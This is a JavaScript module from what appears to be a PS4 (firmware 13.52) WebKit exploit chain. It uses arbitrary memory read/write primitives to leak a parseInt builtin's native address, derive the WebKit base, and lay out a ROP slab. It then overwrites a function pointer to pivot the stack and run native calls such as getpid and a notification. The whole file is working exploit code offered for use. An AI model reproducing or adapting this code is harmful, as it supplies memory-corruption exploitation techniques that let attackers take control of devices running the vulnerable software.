/**
 * PS4 13.52 native call — built from slopkit-core anchors (parseInt + carrier textarea).
 * NOT chain_poops / expm1 / PS5 Collator — uses addresses validated @ PRIMITIVE-OK.
 */
import { int64 } from "./int64.js";
import {
    prepNativeChain, layoutSmokeStack, fireNativeCall, firePivotSmoke,
    stageGetpid, stageNotify, firePivotTrigger,
    verifySlabContent, verifyBisectChainSet,
} from "./native_call.js";

const M_FUNCTION_OFF = 0x28;

function numToI64(n) {
    if (!Number.isFinite(n) || n <= 0) return null;
    const lo = (n >>> 0);
    const hi = Math.floor(n / 0x100000000) >>> 0;
    return new int64(lo, hi);
}

/**
 * Capture mainMf from carrier.native — zero rescan, matches core validation path.
 * @returns {object|null} cap for prepNativeChain
 */
export function captureFromCarrier(p, carrier, off) {
    if (!p || !carrier || !carrier.native) return null;
    const nat = carrier.native;
    const exec = numToI64(nat.executable);
    const targetCell = numToI64(nat.targetCell);
    if (!exec || !targetCell) return null;

    const mainMf = exec.add32(M_FUNCTION_OFF);
    let mainOrig;
    try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
    if (!mainOrig || mainOrig.hi < 0x80) return null;

    const parseRva = (off && off.wk_parseint_native) || 0x1ea18;
    const webkitHint = mainOrig.sub32(parseRva);

    return {
        mainMf,
        mainOrig,
        nativeFn: mainOrig,
        webkitHint,
        pivotTrigger: nat.target || parseInt,
        pivotBuiltinName: "parseint-core",
        path: "core-carrier@PRIMITIVE-OK",
        cell: targetCell,
        pivotObj: carrier.textarea || null,
        pivotCell: numToI64(nat.textareaCell),
        textarea: carrier.textarea || null,
    };
}

export function webkitBaseFromCap(cap, off) {
    if (!cap || !cap.nativeFn || !off) return null;
    const rva = off.wk_parseint_native || off.wk_expm1_builtin;
    if (!rva) return null;
    const base = cap.nativeFn.sub32(rva);
    if (base.hi < 0x80 || base.hi > 0x8f) return null;
    if ((base.low & 0x3fff) !== 0) return null;
    return base;
}

/** Prep slab using core anchors — pivotObj = carrier textarea by default. */
export function prepCoreNative(p, off, carrier, opts) {
    opts = opts || {};
    const cap = captureFromCarrier(p, carrier, off);
    if (!cap) throw new Error("core_native: carrier.native missing — Start first");
    if (!cap.pivotObj) throw new Error("core_native: carrier textarea missing");

    const webkitBase = webkitBaseFromCap(cap, off);
    if (!webkitBase) throw new Error("core_native: webkit base from parseInt failed");

    cap.pivotTrigger = cap.pivotTrigger || parseInt;
    const prep = prepNativeChain(p, off, webkitBase, cap);
    prep.pivotObj = cap.pivotObj;
    prep.pivotCell = cap.pivotCell || p.leakval(cap.pivotObj);
    prep._coreNative = true;
    prep._cap = cap;
    if (prep.keepAlive.indexOf(cap.pivotObj) < 0)
        prep.keepAlive.push(cap.pivotObj);
    if (carrier.textarea && prep.keepAlive.indexOf(carrier.textarea) < 0)
        prep.keepAlive.push(carrier.textarea);
    return prep;
}

export function verifyCoreChain(p, prep, off) {
    const wb = prep.webkitBase;
    if (!wb) return { ok: false, reason: "no webkitBase" };
    const v = verifyBisectChainSet(a => p.read1(a), wb, off);
    return { ok: v.ok, pivot: v.pivot, popBad: v.popBad };
}

export function fireCoreSmoke(p, prep, off, hookMode) {
    layoutSmokeStack(prep);
    const c = verifySlabContent(p, prep);
    if (!c.ok) throw new Error("core smoke slab: " + c.reasons.join("; "));
    return firePivotSmoke(p, prep, off, {
        hook: hookMode || "cell30",
        carrier: window._wkCarrier || null,
    });
}

export function fireCoreGetpid(p, prep, lk, off, hookMode) {
    const stubOff = off.k_stubs && off.k_stubs[20] != null ? off.k_stubs[20] : 0x2cb70;
    const opts = { hook: hookMode || "cell30", carrier: window._wkCarrier || null };
    stageGetpid(p, prep, lk, off, stubOff, opts);
    return fireNativeCall(p, prep, off, opts);
}

export function fireCoreNotify(p, prep, lk, off, hookMode, message) {
    const opts = { hook: hookMode || "cell30", carrier: window._wkCarrier || null };
    stageNotify(p, prep, lk, off, { message });
    return fireNativeCall(p, prep, off, opts);
}

/** Bisect: parseInt(1) with G0 armed — no hook. */
export function bisectCoreTriggerLite(p, prep) {
    if (!prep.mainArmed && prep.mainMf && prep.G) {
        p.write8(prep.mainMf, prep.G.G0);
        prep.mainArmed = true;
    }
    firePivotTrigger(prep, 1);
}
